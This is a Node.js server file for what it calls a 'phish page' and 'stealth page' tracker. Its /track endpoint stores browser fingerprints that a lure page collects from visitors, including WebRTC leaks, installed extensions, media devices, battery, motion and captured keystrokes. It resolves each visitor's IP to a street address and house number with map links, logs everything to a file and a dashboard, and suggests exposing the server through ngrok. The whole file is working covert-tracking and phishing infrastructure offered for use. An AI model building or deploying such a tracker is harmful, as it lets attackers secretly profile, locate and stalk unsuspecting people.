const http = require('http');
const fs = require('fs');
const url = require('url');
const crypto = require('crypto');
const path = require('path');

const PORT = 3000;
let tracks = [];

// ==================== REAL GEOLOCATION ONLY - NO MOCK DATA ====================
function getRealGeoWithAddress(ip, callback) {
  const cleanIp = ip.replace(/^::ffff:/, '');
  
  // Skip private IPs - they have no real location
  const privateRanges = ['127.', '10.', '192.168.', '172.16.', '::1'];
  if (privateRanges.some(r => cleanIp.startsWith(r))) {
    return callback(null); // Return null for private IPs - no mock data
  }
  
  // IP → Lat/Lon (REAL only)
  http.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,lat,lon,isp,org,mobile,proxy,hosting`, res => {
    let data = ''; 
    res.on('data', c => data += c); 
    res.on('end', () => {
      try {
        const geo = JSON.parse(data);
        if (geo.status !== 'success') return callback(null); // Only success, no fallbacks
        
        const lat = geo.lat, lon = geo.lon;
        
        // Lat/Lon → Street Address (REAL only)
        http.get(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, revRes => {
          let addrData = ''; 
          revRes.on('data', c => addrData += c); 
          revRes.on('end', () => {
            try {
              const address = JSON.parse(addrData);
              
              callback({
                city: geo.city,
                lat, lon,
                isp: geo.isp,
                country: geo.country,
                region: geo.regionName,
                mobile: geo.mobile,
                proxy: geo.proxy,
                hosting: geo.hosting,
                address: address.display_name,
                street: address.address?.road,
                house: address.address?.house_number,
                neighbourhood: address.address?.neighbourhood,
                postcode: address.address?.postcode,
                mapsLink: `https://www.google.com/maps?q=${lat},${lon}`,
                streetView: `https://www.google.com/maps/@${lat},${lon},18z?entry=ttu`,
                real: true
              });
            } catch {
              callback(null); // No mock data on error
            }
          });
        }).on('error', () => callback(null)); // No mock data on error
      } catch { 
        callback(null); // No mock data on error
      }
    });
  }).on('error', () => callback(null)); // No mock data on error
}

// ==================== HELPER FUNCTION TO SERVE HTML FILES ====================
function serveHTMLFile(res, filename, contentType = 'text/html') {
  fs.readFile(path.join(__dirname, filename), (err, data) => {
    if (err) {
      res.writeHead(404);
      res.end('File not found');
      return;
    }
    res.writeHead(200, { 'Content-Type': contentType });
    res.end(data);
  });
}

// ==================== SERVER ====================
const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  // ========== TRACKING ENDPOINT ==========
  if (parsed.pathname === '/track') {
    const fpData = parsed.query;
    
    const track = {
      id: crypto.randomBytes(4).toString('hex'),
      ts: new Date().toISOString(),
      ip, 
      ua: req.headers['user-agent'],
      ref: req.headers.referer || '',
      fp: {
        canvas: fpData.canvas,
        webgl: fpData.webgl,
        audio: fpData.audio,
        webrtc: fpData.webrtc,
        fonts: fpData.fonts ? JSON.parse(fpData.fonts) : null,
        hardware: fpData.hardware ? JSON.parse(fpData.hardware) : null,
        extensions: fpData.extensions ? JSON.parse(fpData.extensions) : null,
        mediaDevices: fpData.mediaDevices ? JSON.parse(fpData.mediaDevices) : null,
        keystrokes: fpData.keystrokes ? JSON.parse(fpData.keystrokes) : null,
        battery: fpData.battery,
        motion: fpData.motion
      }
    };
    
    getRealGeoWithAddress(ip, geo => {
      if (geo) {
        track.geo = geo;
        console.log(`\n🎯 [${track.ts.slice(11,19)}] ${track.id}`);
        console.log(`   📍 ${geo.address}`);
        console.log(`   🗺️  ${geo.mapsLink}`);
        console.log(`   📡 ${geo.isp} | ${geo.country}`);
      } else {
        track.geo = null;
        console.log(`\n🎯 [${track.ts.slice(11,19)}] ${track.id} - NO LOCATION (private/VPN)`);
      }
      
      tracks.unshift(track);
      if (tracks.length > 500) tracks = tracks.slice(0, 500);
      fs.appendFileSync('tracks.jsonl', JSON.stringify(track) + '\n');
    });
    
    res.writeHead(200, {'Content-Type': 'text/plain'});
    res.end('OK');
    return;
  }
  
  // ========== SERVE INDEX.HTML (STEALTH PAGE) ==========
  if (parsed.pathname === '/' || parsed.pathname === '/maps') {
    serveHTMLFile(res, 'index.html');
    return;
  }
  
  // ========== SERVE DASHBOARD.HTML ==========
  if (parsed.pathname === '/dashboard') {
    // Read the dashboard HTML and inject dynamic data
    fs.readFile(path.join(__dirname, 'dashboard.html'), 'utf8', (err, data) => {
      if (err) {
        res.writeHead(404);
        res.end('Dashboard file not found');
        return;
      }
      
      // Replace placeholders with actual data
      const html = data
        .replace('{{TOTAL_TRACKS}}', tracks.length)
        .replace('{{REAL_LOCATIONS}}', tracks.filter(t => t.geo && t.geo.real).length)
        .replace('{{NO_LOCATION}}', tracks.filter(t => !t.geo || !t.geo.real).length)
        .replace('{{WEBRTC_LEAKS}}', tracks.filter(t => t.fp && t.fp.webrtc).length)
        .replace('{{BATTERY_COUNT}}', tracks.filter(t => t.fp && t.fp.battery).length)
        .replace('{{TRACKS_DATA}}', JSON.stringify(tracks.slice(0, 50)));
      
      res.writeHead(200, { 'Content-Type': 'text/html' });
      res.end(html);
    });
    return;
  }
  
  // ========== CLEAR DATA ENDPOINT ==========
  if (parsed.pathname === '/clear' && req.method === 'POST') {
    tracks = [];
    res.writeHead(200);
    res.end('Cleared');
    return;
  }
  
  // ========== API ENDPOINT TO GET TRACKS DATA ==========
  if (parsed.pathname === '/api/tracks') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(tracks.slice(0, 50)));
    return;
  }
  
  res.writeHead(404);
  res.end('Not found');
});

server.listen(PORT, () => {
  console.log('\n' + '═'.repeat(80));
  console.log('🎯 REAL-TIME TRACKER - 100% ACCURATE DATA ONLY');
  console.log('═'.repeat(80));
  console.log(`\n🎣 PHISH PAGE:    http://localhost:${PORT}/`);
  console.log(`📊 DASHBOARD:     http://localhost:${PORT}/dashboard`);
  console.log(`📁 LOG FILE:      tracks.jsonl`);
  console.log('\n✅ NO MOCK DATA - ONLY REAL LOCATIONS SHOWN');
  console.log('   • Private IPs show "NO LOCATION"');
  console.log('   • VPN/Proxy users show nothing');
  console.log('   • Only real geolocation data passes through');
  console.log('\n🚀 FOR EXTERNAL ACCESS: ngrok http 3000');
  console.log('═'.repeat(80));
});